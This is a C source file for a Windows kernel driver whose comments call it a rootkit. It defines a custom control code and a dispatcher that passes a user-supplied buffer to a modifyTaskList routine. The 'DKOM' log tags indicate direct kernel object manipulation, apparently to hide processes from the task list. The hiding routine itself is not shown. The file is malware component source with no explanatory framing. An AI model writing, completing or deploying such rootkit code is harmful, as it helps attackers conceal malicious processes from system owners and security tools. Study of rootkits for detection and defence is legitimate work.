#include "driver.h"

// IRP code that will call our rootkit functionality
#define IRP_CODE_HIDE 0x900 

// Default IRP dispatcher, passthrough no action, return STATUS_SUCCESS
NTSTATUS defaultIrpHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP IrpMessage) {

	UNREFERENCED_PARAMETER(DeviceObject);

	// Set status as success
	IrpMessage->IoStatus.Status = STATUS_SUCCESS;
	IrpMessage->IoStatus.Information = 0;

	// Complete request
	IoCompleteRequest(IrpMessage, IO_NO_INCREMENT);

	return(STATUS_SUCCESS);
}

// Handler to recieve IRP request and call Rootkit functionality
NTSTATUS IrpCallRootkit(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {

	UNREFERENCED_PARAMETER(DeviceObject);
	NTSTATUS status = STATUS_SUCCESS;
	PIO_STACK_LOCATION  irpSp;
	ULONG               inBufLength, outBufLength, code;
	PVOID               inBuf;

	irpSp = IoGetCurrentIrpStackLocation(Irp);
	inBufLength = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	outBufLength = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	code = irpSp->Parameters.DeviceIoControl.IoControlCode;

	switch (code) {

		case IRP_CODE_HIDE:
			inBuf = Irp->AssociatedIrp.SystemBuffer;
			Irp->IoStatus.Information = strlen(inBuf);
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "DKOM: incoming IRP : %s", inBuf));

			modifyTaskList(inBuf);
			
			break;

		default:
			status = STATUS_INVALID_DEVICE_REQUEST;
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "DKOM Error : STATUS_INVALID_DEVICE_REQUEST\n"));
			break;
	}
	return status;
}